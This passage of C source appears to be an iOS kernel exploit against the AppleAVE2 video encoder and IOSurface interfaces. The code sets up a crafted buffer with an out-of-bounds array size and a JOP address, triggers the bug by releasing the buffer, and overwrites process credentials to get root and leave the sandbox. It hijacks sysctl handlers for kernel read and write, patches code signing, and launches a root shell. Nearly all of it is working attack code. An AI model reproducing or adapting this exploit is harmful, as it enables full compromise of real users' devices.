    *(uint64_t*)(clientbuf + 0x0) = JOP_ADDRESS + kaslr; // leads to JOP
    *(uint32_t*)(clientbuf + 0x7F4) = 0x6; // clientbuf->MEMORY_INFO_array_size1
    *(uint64_t*)(clientbuf + 0x3420) = 0x6; // clientbuf->MEMORY_INFO_array_size2
    // 5 is the limit here, 6 gives an extra round which become over-boundary reading
    
    Send_overwritting_iosurfaceMap((uint64_t)clientbuf, surface1_map_size, surface1_map_addr);
    Reply_notify_completion();
    free(clientbuf);
    
    char *input_stru = calloc(1, 264); //0x108
    *(uint32_t*)(input_stru + 4) = iosurface_1; //FrameQueueSurfaceId
    *(uint32_t*)(input_stru + 8) = iosurface_1; //InitInfoSurfaceId, vulnerable iosurface user
    
    *(uint32_t*)(input_stru + 12) = iosurface_1; //ParameterSetsBuffer
    
    *(uint32_t*)(input_stru + 208) = iosurface_1; // codedHeaderCSID & codedHeaderBuffer [0]
    *(uint32_t*)(input_stru + 212) = iosurface_1; // codedHeaderCSID & codedHeaderBuffer [1]
    
    size_t output_stru_size = 0x4;
    char *output_stru = calloc(1, output_stru_size);
    
    uint64_t exploiting_thread_id = thread_getId( mach_thread_self() );
    
    // Load crafted clientbuf into chamber
    IOConnectCallStructMethod(ioconn, 7, input_stru, 0x108, output_stru, &output_stru_size);
   
    pthread_t p1 = NULL;
    pthread_create(&p1, &pth_commAttr, (void*)pwn_assist_thread, (void*)exploiting_thread_id);
    
    printf("Triggering vulnerability...\n");
    {
        // Release the clientbuf to trigger vulnerability
        size_t input_stru_size = 0x4;
        char *input_stru = calloc(1, input_stru_size);
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(ioconn, 1, input_stru, input_stru_size, output_stru, &output_stru_size);
    }
    
    while(!proceed_to_post_exp){};
    
    // Release the spray memory
    IOSurfaceRootUserClient_sRemoveValue(surface_ioconn, iosurface_1);
    
    {
        // Release the surface
        uint64_t input_sca = iosurface_1;
        IOConnectCallScalarMethod(surface_ioconn, 1, &input_sca, 1, NULL, NULL);
    }
}

void kernel_exp_start(io_connect_t profile_ioconn, io_connect_t ave_ioconn, io_connect_t surface_ioconn){
    
    pth_commAttr_init();
    
    semaphore_create(mach_task_self(), &exp_machsema, SYNC_POLICY_FIFO, 0);
    
    semaphore_stru_fromKernel = calloc(1, sizeof(*semaphore_stru_fromKernel));
    
    print_line("2/3\n");
    
    Get_kaslr(profile_ioconn); printf("kaslr: 0x%x\n", kaslr);
    
    ucred_get_root_also_unsandbox = calloc(1, 0x68);
    // The rest credential members are left as empty(0), means root and wheel, etc !!
    *(uint64_t*)(ucred_get_root_also_unsandbox + 0x60) = JOP_ADDRESS + kaslr + 0x1000; // will overwrite cr_lable at +0x78
    /*
     ucred_get_root_also_unsandbox contains the data that's used in JOP to overwriting credentials:
     
     ucred.h`struct ucred. From
     uid_t    cr_uid //+0x18, to
     struct label    *cr_label; //+0x78, size: (0x78+0x8) - 0x18 = 0x68
     
     This offset is relatively stable, safe to be hardcoded.
     */
    
    
    override_sysctl_forRW = calloc(1, 36);
    *(int*)(override_sysctl_forRW) = 0xD4C00005; //oid_type
    *(uint64_t*)(override_sysctl_forRW + 4) = 0x0; // arg1 r/w target address
    *(uint64_t*)(override_sysctl_forRW + 12) = 0; // arg1 r/w length
    *(uint64_t*)(override_sysctl_forRW + 20) = 0xFFFFFFF007061A21 + kaslr; //l1icachesize_compat
    *(uint64_t*)(override_sysctl_forRW + 28) = 0xFFFFFFF00748E0D8 + kaslr; //sysctl_handle_opaque
    
    
    override_sysctl_forSet = calloc(1, 36);
    *(int*)(override_sysctl_forSet) = 0xD4C00005;
    *(uint64_t*)(override_sysctl_forSet + 4) = 0xFFFFFFF007656D88 + kaslr; //Overwrite oid_arg1/oid_arg2
    *(uint64_t*)(override_sysctl_forSet + 12) = 16;
    *(uint64_t*)(override_sysctl_forSet + 20) = 0xFFFFFFF007061A35 + kaslr; //l1dcachesize_compat
    *(uint64_t*)(override_sysctl_forSet + 28) = 0xFFFFFFF00748E0D8 + kaslr; //sysctl_handle_opaque
    
    AppleAVE2UserClient_sPrepareToEncodeFrame(ave_ioconn, surface_ioconn);
    
    IOServiceClose(profile_ioconn);
    IOServiceClose(ave_ioconn);
    IOServiceClose(surface_ioconn);
    
    // Notify unsandboxed system daemon to exit
    Send_exit_msg();
    
    extern struct timeval gettimeofday_start, gettimeofday_end;
    gettimeofday(&gettimeofday_end, NULL);
    print_line("3/3\n");
    printf_wow("Time Spent: %0.2fs\n",((gettimeofday_end.tv_sec  - gettimeofday_start.tv_sec) * 1000000u + gettimeofday_end.tv_usec - gettimeofday_start.tv_usec) / 1.e6);
    
    extern void display_win(void);
    display_win();
    
    print_line("TFP0 Built\n");
    print_line("Codesign Patched\n");
    print_line("Running root shell...\n");
    
    extern void post_exp_main(void);
    post_exp_main();
}
